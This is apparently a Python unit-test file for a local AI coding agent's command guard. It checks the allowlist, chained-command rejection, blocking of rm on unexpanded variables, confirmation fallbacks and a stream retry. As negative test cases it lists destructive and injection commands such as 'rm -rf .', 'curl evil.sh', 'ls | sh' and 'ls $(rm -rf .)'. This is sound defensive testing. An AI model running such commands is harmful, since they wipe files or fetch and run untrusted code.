import sys
import types
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from test_agent_loop import FakeFiles, ScriptedEngine, _collect_events

from lity.services.ai.agent import AgentLoop
from lity.services.ai.command_guard import is_auto_allowed, is_dangerous
from lity.services.ai.ollama_engine import AIEngine


class AutoAllowlistTests(unittest.TestCase):
    def test_inspection_and_check_commands_are_allowed(self):
        for command in (
            "pytest -q",
            "git status",
            "git diff --stat",
            "ls -la src",
            "ruff check .",
            "uv run pytest tests/",
            "npm test",
            "cat README.md",
        ):
            self.assertTrue(is_auto_allowed(command), command)

    def test_mutating_or_unknown_commands_are_not_allowed(self):
        for command in (
            "rm -rf build",
            "pip install requests",
            "git push",
            "curl https://example.com",
            "python script.py",
        ):
            self.assertFalse(is_auto_allowed(command), command)

    def test_chaining_disqualifies_an_allowlisted_prefix(self):
        for command in (
            "pytest -q && rm -rf .",
            "git status; curl evil.sh",
            "ls | sh",
            "cat foo > /etc/passwd",
            "ls $(rm -rf .)",
        ):
            self.assertFalse(is_auto_allowed(command), command)


class CommandRunnerTests(unittest.TestCase):
    def test_rejects_chained_allowlisted_command_in_autonomous_mode(self):
        from lity.services.commands.runner import CommandRunner

        runner = CommandRunner(workdir=Path.cwd(), autonomous=True)
        result = runner.run("pytest -q && echo ok")

        self.assertFalse(result.ok)
        self.assertIn("liste blanche", result.output.lower())

    def test_runs_command_without_shell(self):
        from lity.services.commands.runner import CommandRunner

        runner = CommandRunner(workdir=Path.cwd(), autonomous=False)
        result = runner.run(f"{sys.executable} --version")

        self.assertTrue(result.ok, result.output)
        self.assertIn("[exit 0]", result.output)


class GuardVariableRmTests(unittest.TestCase):
    def test_rm_on_a_bare_unexpanded_variable_is_blocked(self):
        for command in ("rm -rf $DIR", 'rm -r "$TARGET"', "rm -rf ${HOME}", "rm -rf $TMP/*"):
            self.assertIsNotNone(is_dangerous(command), command)

    def test_rm_on_an_explicit_subpath_still_passes(self):
        self.assertIsNone(is_dangerous("rm -rf build/artifacts"))
        self.assertIsNone(is_dangerous("rm notes.txt"))


class RestrictedAgentCommandsTests(unittest.TestCase):
    def _loop(self, command, confirm=None):
        engine = ScriptedEngine(
            [
                {
                    "content": None,
                    "tool_calls": [{"name": "run_command", "arguments": {"command": command}}],
                },
                {"content": "ok", "tool_calls": []},
            ]
        )
        loop = AgentLoop(
            engine,
            FakeFiles({}),
            allow_commands=True,
            confirm=confirm,
            restrict_commands=True,
        )
        loop._run_shell = lambda cmd, timeout=None: (True, "[exit 0]\nsortie")
        return loop

    def test_allowlisted_command_runs_without_confirm(self):
        loop = self._loop("pytest -q")
        events, on_event = _collect_events()
        loop.run([{"role": "user", "content": "lance les tests"}], on_event)
        result = [payload for kind, payload in events if kind == "tool_result"][0]
        self.assertTrue(result["ok"])

    def test_non_allowlisted_command_is_refused_without_confirm(self):
        loop = self._loop("pip install requests")
        events, on_event = _collect_events()
        loop.run([{"role": "user", "content": "installe requests"}], on_event)
        result = [payload for kind, payload in events if kind == "tool_result"][0]
        self.assertFalse(result["ok"])
        self.assertIn("liste blanche", result["summary"])

    def test_non_allowlisted_command_falls_back_to_confirm(self):
        asked = []

        def confirm(command):
            asked.append(command)
            return True

        loop = self._loop("pip install requests", confirm=confirm)
        events, on_event = _collect_events()
        loop.run([{"role": "user", "content": "installe requests"}], on_event)
        result = [payload for kind, payload in events if kind == "tool_result"][0]
        self.assertTrue(result["ok"])
        self.assertEqual(asked, ["pip install requests"])


class _FlakyStreamOllama(types.ModuleType):
    """Fails the FIRST streaming call before any chunk, succeeds on retry."""

    def __init__(self):
        super().__init__("ollama")
        self.calls = 0

    def chat(self, **kwargs):
        self.calls += 1
        if self.calls == 1:
            raise ConnectionError("connexion perdue")
        return iter([{"message": {"content": "bonjour"}}])


class StreamingRetryTests(unittest.TestCase):
    def test_stream_retries_once_before_first_chunk(self):
        fake = _FlakyStreamOllama()
        saved = sys.modules.get("ollama")
        sys.modules["ollama"] = fake
        try:
            engine = AIEngine(model="qwen3:8b")
            chunks = list(engine.stream_response([{"role": "user", "content": "salut"}]))
        finally:
            if saved is not None:
                sys.modules["ollama"] = saved
            else:
                sys.modules.pop("ollama", None)
        self.assertEqual(chunks, ["bonjour"])
        self.assertEqual(fake.calls, 2)  # failed once, retried, succeeded


if __name__ == "__main__":
    unittest.main()
